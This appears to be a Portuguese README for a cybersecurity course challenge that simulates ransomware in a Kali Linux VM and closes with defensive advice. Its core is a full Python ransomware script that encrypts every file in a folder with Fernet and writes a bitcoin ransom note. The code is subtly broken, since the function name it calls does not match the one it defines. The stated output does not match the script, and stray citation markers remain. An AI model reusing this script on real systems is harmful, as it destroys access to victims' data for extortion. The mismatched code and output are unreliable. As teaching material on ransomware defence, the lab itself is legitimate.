# Desafio de Cibersegurança: Ransomware e Keylogger

## Sobre o Projeto
[cite_start]Este projeto documenta a exploração e análise de vulnerabilidades relacionadas à segurança de endpoints, com foco na simulação do comportamento de **Ransomware** e **Keylogger** em um ambiente 100% controlado[cite: 1, 3]. [cite_start]O objetivo é demonstrar como essas ameaças digitais funcionam, como capturam ou sequestram dados, e, principalmente, como podemos **detectar, mitigar e nos proteger** delas no mundo real[cite: 1, 4].

---

## Ambiente e Ferramentas
* **Linguagem:** Python 3 (para os scripts de simulação)
* **Ambiente:** Máquina virtual Linux (Kali Linux)
* [cite_start]**Ferramentas Simuladas:** Ransomware (criptografia/descriptografia) e Keylogger (captura de teclado e exfiltração) [cite: 1]
* [cite_start]**Entrega:** Repositório público no GitHub com arquivo `README.md` detalhado e pasta `/Images` [cite: 2]

## Cenário 1: Ransomware (Criptografia de Arquivos)
Este cenário simula o comportamento de um ransomware real, gerando uma chave de criptografia, localizando arquivos de teste (test_files) e os criptografando, deixando para trás uma mensagem de resgate.

### Estrutura do Projeto (Antes da Execução)
Para rodar o script, o ambiente foi organizado da seguinte forma:

/MALWARE
├── ransomware.py     # Script principal.
└── test_files/       # Pasta com arquivos para o teste.
    ├── dados_confidenciais
    └── senhas.txt
### Código de Execução (ransomware.py)
A seguir está o código Python utilizado. A função main orquestra a geração da chave, a criptografia dos arquivos na pasta test_files e a criação da mensagem de resgate.

```bash
import os
from cryptography.fernet import Fernet

# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

# 4. Descriptografar um único arquivo (A "Solução" ou "Chave de Resgate")
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados_criptografados = file.read()
    dados_decriptografados = f.decrypt(dados_criptografados)
    with open(arquivo, "wb") as file:
        file.write(dados_decriptografados)

# 5. Encontrar arquivos para criptografar/descriptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# 6. Mensagem de resgate
def criar_mensagem_restage():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

# 7. Execução principal (Ataque)
def main():
    print("[+] INICIANDO ATAQUE...")
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files") 
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("[+] Ransomware executado com sucesso! Arquivos criptografados!")
    print("[+] Mensagem de resgate criada: LEIA ISSO.txt")

if __name__ == "__main__":
    main()
```
### Execução e Evidências
Comando de Execução:

```bash
python3 ransomware.py
```
Log de Saída Esperado:
```text
Ransomware executado! Arquivos criptografados!
```



🛡️ Análise e Mitigação do Ransomware
Análise da Vulnerabilidade
O ataque é eficaz porque usa uma criptografia forte (Fernet), exige pouca interação do usuário (basta que o script seja executado uma única vez) e a chave fica inacessível ao usuário. O sucesso do ataque depende da falha de controle de execução e da ausência de backups no momento da infecção.

Recomendações de Segurança (Defesa)
Backup Imediato (Regra 3-2-1): A defesa mais crucial é manter backups recentes, preferencialmente seguindo a regra 3-2-1 (3 cópias, em 2 mídias diferentes, 1 cópia fora do local/offline). Isso torna o resgate desnecessário.

Princípio do Mínimo Privilégio: Limitar as permissões de acesso do usuário. Se o usuário infectado não tiver permissão para gravar/modificar arquivos de sistema ou pastas importantes, o dano do ransomware será contido.

Endpoint Detection and Response (EDR): Utilizar soluções avançadas (EDR) que detectam o comportamento do ransomware (tentativas rápidas e em massa de criptografar arquivos) e não apenas a assinatura do arquivo.

Conscientização do Usuário (Phishing): A maioria dos ransomwares é distribuída via anexos de e-mail ou links maliciosos. Treinamento constante para evitar clicar em fontes não confiáveis é vital.
